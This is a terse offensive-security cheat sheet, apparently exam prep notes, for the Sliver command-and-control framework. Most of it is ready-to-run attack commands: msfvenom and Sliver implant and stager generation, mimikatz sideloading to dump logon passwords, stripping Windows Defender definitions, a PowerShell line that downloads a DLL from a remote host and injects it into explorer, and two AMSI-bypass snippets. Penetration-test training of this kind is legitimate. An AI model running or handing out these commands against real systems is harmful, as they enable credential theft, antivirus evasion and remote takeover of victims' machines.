# Install Guide:

- https://bishopfox.com/blog/passing-the-osep-exam-using-sliver

- Run the following command, sliver install complete
```bash
curl https://sliver.sh/install|sudo bash 
systemctl start sliver
systemctl enable sliver
```

- Run the following to install tooling:
```bash
sliver
armory install *
```

# Stagers


```bash
# Set -a 386 for word macros
profiles new --mtls ip:443 --format shellcode win-shellcode

mtls -l 443

stage-listener --url http://ip:8443 --profile win-shellcode --prepend-size

generate stager --lhost ip --lport 8443 --protocol http 

# the above will likely not work so try the following:
# Adjust the format as needed, common formats: exe, raw, csharp, vbapplication. x86 for macros
msfvenom -a x64 -p windows/x64/custom/reverse_winhttp LHOST=tun0 LPORT=8443 LURI=/payload.woff -f exe -o sliverstage.exe EXITFUNC=thread


# Use this with hollowghost
msfvenom -p windows/x64/custom/reverse_winhttp LHOST=tun0 LPORT=8443 EXITFUNC=thread LURI=/payload.woff -f csharp --encrypt xor --encrypt-key z -i 20 | tr -d '\n\r'
```

# Generating malware
```bash

# DLL
generate -e -f shared -m 192.168.45.249:443 -R

# executable
generate  -e -f exe -m 192.168.45.249:443 

# For beacons add `beacon` at the beginning and `-S` for timeout and `-J` for jitter

# Generate shellcode to execute in sliver process, be sure to upload a session to execute it.
donut /var/www/html/bin/PrintSpoofer64.exe -a 2 -b 2 -o /tmp/payload.bin -p '-c c:\windows\tasks\sph.exe'
```

# Executing Commands

# Sideloading tools
```
sideload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
```

# Nuke defender
```
execute -o cmd /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

# Injection 
```
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.192/bruh.dll'); $procid = (Get-Process -Name explorer).Id ;Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

# AMSI:
```
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```
- this better 
```
$a = [Ref].Assembly.GetTypes();foreach ($b in $a) {if ($b.Name -like "*ils") {if ($b.Name -like "Am*"){$c=$b}}};$d = $c.GetFields('NonPublic,Static');foreach($e in $d) {if ($e.Name -like "*itFa*") {$f=$e}};$f.SetValue($null,$true)
```
